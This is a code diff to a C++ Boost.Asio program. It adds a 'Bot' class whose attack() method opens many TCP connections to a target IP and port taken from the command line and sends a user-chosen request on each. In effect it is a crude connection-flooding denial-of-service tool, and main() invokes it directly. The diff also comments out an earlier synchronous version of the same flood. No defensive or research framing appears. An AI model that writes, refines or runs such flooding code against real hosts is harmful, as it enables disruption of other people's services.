@@ -9,7 +9,9 @@
 
 #include "boost/system/error_code.hpp"
 #include <boost/thread/thread.hpp>
+#include <boost/bind.hpp>
 #include <boost/functional.hpp>
+
 
 const int DELAY = 5;
 
@@ -21,97 +23,87 @@ boost::mutex io_mutex;
 boost::condition_variable cond_var;
 bool ready_socket = false;
 
-//
-//const std::string addr = "127.0.0.1";
-//
-//std::string data;
-//
-//io_service service;
-//ip::tcp::endpoint ep(ip::address::from_string(addr), 8000);// listen on 8000
-//ip::tcp::acceptor acc(service, ep);
 
-/*struct talk_to_svr
-{
-    talk_to_svr(const std::string & username): sock_(service), started_(true), username_(username) {}
-    void connect(ip::tcp::endpoint ep)
-    {
-        sock_.connect(ep);
-    }
-    void loop()
-    {
-        write("login " + username_ + "\n");
-        read_answer();
-//        while ( started_)
-//        {
-//            write_request();
-//            read_answer();
-//            boost::this_thread::sleep(5);
-//        }
-    }
-
-    void write(const std::string & msg) { sock_.write_some(buffer(msg)); }
-    size_t read_complete(char * buf, const boost::system::error_code & err, size_t bytes)
-    {
-        if ( err) return 0;
-        bool found = std::find(buf, buf + bytes, '\n') < buf + bytes;
-        // we read one-by-one until we get to enter, no buffering
-        return found ? 0 : 1;
-    }
-
-    void write_request()
-    {
-        write("ping\n");
-    }
-    void read_answer()
-    {
-        already_read_ = 0;
-        read(sock_, buffer(buff_),
-             boost::bind(&talk_to_svr::read_complete, this, _1, _2));
-        process_msg();
-    }
-    void process_msg()
-    {
-        std::string msg(buff_, already_read_);
-//        if ( msg.find("login ") == 0) on_login();
-//        else if ( msg.find("ping") == 0) on_ping(msg);
-//        else if ( msg.find("clients ") == 0) on_clients(msg);
-//        else std::cerr << "invalid msg " << msg << std::endl;
-    }
-    std::string username() const { return username_; }
+class Bot{
 private:
-    ip::tcp::socket sock_;
-    enum { max_msg = 1024 };
-    int already_read_;
-    char buff_[max_msg];
-    bool started_;
-    std::string username_;
-};*/
+    io_service service;
+    ip::tcp::endpoint ep;
+    //ip::tcp::acceptor acc;
+    size_t NUMBER_OF_THREADS = 4;
 
-//size_t read_complete(char * buf, const boost::system::error_code & err, size_t bytes)
-//{
-//    if ( err) return 0;
-//    bool found = std::find(buf, buf + bytes, '\n') < buf + bytes;
-//    // we read one-by-one until we get to enter, no buffering
-//    return found ? 0 : 1;
-//}
-//
-//std::string process_msg(std::string& msg) {
-//    return msg;
-//}
-//
-//size_t read_answer(ip::tcp::socket& sock_)
-//{
-//    char buff_[1024];
-//    size_t already_read_ = 0;
-//    try {
-//        read(sock_, buffer(buff_),
-//             boost::bind(read_complete, _1, _2));
-//    }catch(boost::system::system_error& e){
-//        return 1;
-//    }
-//    process_msg(std::ref(std::string(buff_)));
-//    return 0;
-//}
+    void run(){
+        for(size_t i=0; i<this->socket_number; ++i) {
+            socket_ptr sock(new ip::tcp::socket(this->service));
+            connect(sock);
+        }
+        this->service.run();
+    }
+
+    void connect(socket_ptr sock){
+        sock.get()->async_connect(this->ep,
+                                  [this, sock](const boost::system::error_code& ec)
+                                  {
+                                      handle_connect(ec, sock);
+                                  });
+    }
+
+    void handle_connect(const boost::system::error_code& ec, socket_ptr sock){
+        if (!ec) {
+            size_t bytes_tr;
+            sock.get()->async_write_some(buffer(this->request),
+                                         [this, sock](const boost::system::error_code& ec, size_t bytes_trans)
+                                        {
+                                            handle_write(ec, bytes_trans, sock);
+                                        }   );
+            //write(*sock, buffer(this->request));
+        }else{
+            std::cerr << ec.message() << std::endl;
+        }
+
+    }
+
+    void handle_write(const boost::system::error_code& ec, size_t bytes_trans, socket_ptr sock){
+        if (!ec) {
+            std::cout <<"Success" << std::endl;
+            std::string response;
+            sock.get()->close();
+            //sock.get()->async_read_some(buffer(response), bind(&Bot::handle_read, this, ec, sock));
+        }else{
+            std::cerr << ec.message() << std::endl;
+        }
+    }
+
+    void handle_read(boost::system::error_code& ec, socket_ptr sock){
+        if (!ec){
+            sock.get()->close();
+        }
+    }
+
+public:
+    ip::address target;
+    size_t port;
+    std::string request;
+    size_t socket_number;
+
+    Bot(char* target, char* port, char* request, char* socket_number){
+        this->target = ip::address::from_string(target);;
+        this->port = (size_t)atoi(port);
+        this->ep = ip::tcp::endpoint(this->target, this->port);
+        this->request = std::string(request);
+        this->socket_number = (size_t)atoi(socket_number);
+    }
+
+    void attack(){
+        std::vector<boost::thread> threads;
+        for (size_t i=0; i<this->NUMBER_OF_THREADS; ++i){
+            run();
+        }
+        boost::this_thread::sleep( boost::posix_time::millisec(500));
+    }
+
+
+};
+
 void sock_connect(socket_ptr sock, ip::tcp::endpoint &ep) {
     sock->connect(ep);
     //boost::lock_guard<boost::mutex> lg(io_mutex);
@@ -139,6 +131,12 @@ void my_write(socket_ptr sock_, std::string msg, ip::address &addr) {
 void hello(int a, std::string s, socket_ptr sock) {}
 
 int main(int argc, char *argv[]) {
+    Bot bot(argv[1], argv[2], argv[3], argv[4]);
+    bot.attack();
+
+
+
+
 //    char *URL = argv[1];
 //    int NUM = std::atoi(argv[2]);
 //    //curlppGetWithResp(URL);
@@ -147,36 +145,36 @@ int main(int argc, char *argv[]) {
 //    Bot bot1(URL, NUM);
 //    int fails = bot1.attack();
 //    std::cout << "FAILED:" << fails << std::endl;
-    io_service service;
-    ip::address target = ip::address::from_string(argv[1]);
-    ip::tcp::endpoint ep(target, 2021);
-    ip::tcp::acceptor acc(service, ep);
-    const int socket_number = atoi(argv[3]);
-
-    //std::vector<boost::thread> connection_threads;
-
-    // writing threads
-    std::string msg = std::string(argv[2]);
-    std::vector<boost::thread> write_threads;
-
-    // connection
-    socket_ptr sockets[socket_number];
-    for (size_t i = 0; i < socket_number; ++i) {
-        socket_ptr sock(new ip::tcp::socket(service));
-        sockets[i] = sock;
-        //connection_threads.emplace_back(boost::thread(sock_connect, sock, boost::ref(ep) ));
-        sock_connect(sock, boost::ref(ep));
-        boost::this_thread::sleep_for(boost::chrono::milliseconds(DELAY));
-    }
-
-    //write data
-    size_t sock_indx;
-    for (size_t i = 0; i < socket_number; ++i) {
-        sock_indx = i % socket_number;
-        //msg.append("A");
-        //write_threads.emplace_back(boost::thread(my_write, sockets[sock_indx], std::string(msg), boost::ref(target) ));
-        my_write(sockets[sock_indx], std::string(msg), boost::ref(target));
-    }
+//    io_service service;
+//    ip::address target = ip::address::from_string(argv[1]);
+//    ip::tcp::endpoint ep(target, 2021);
+//    ip::tcp::acceptor acc(service, ep);
+//    const int socket_number = atoi(argv[3]);
+//
+//    //std::vector<boost::thread> connection_threads;
+//
+//    // writing threads
+//    std::string msg = std::string(argv[2]);
+//    std::vector<boost::thread> write_threads;
+//
+//    // connection
+//    socket_ptr sockets[socket_number];
+//    for (size_t i = 0; i < socket_number; ++i) {
+//        socket_ptr sock(new ip::tcp::socket(service));
+//        sockets[i] = sock;
+//        //connection_threads.emplace_back(boost::thread(sock_connect, sock, boost::ref(ep) ));
+//        sock_connect(sock, boost::ref(ep));
+//        boost::this_thread::sleep_for(boost::chrono::milliseconds(DELAY));
+//    }
+//
+//    //write data
+//    size_t sock_indx;
+//    for (size_t i = 0; i < socket_number; ++i) {
+//        sock_indx = i % socket_number;
+//        //msg.append("A");
+//        //write_threads.emplace_back(boost::thread(my_write, sockets[sock_indx], std::string(msg), boost::ref(target) ));
+//        my_write(sockets[sock_indx], std::string(msg), boost::ref(target));
+//    }
 
 //    for (auto &thr : connection_threads) {
 //        thr.join();
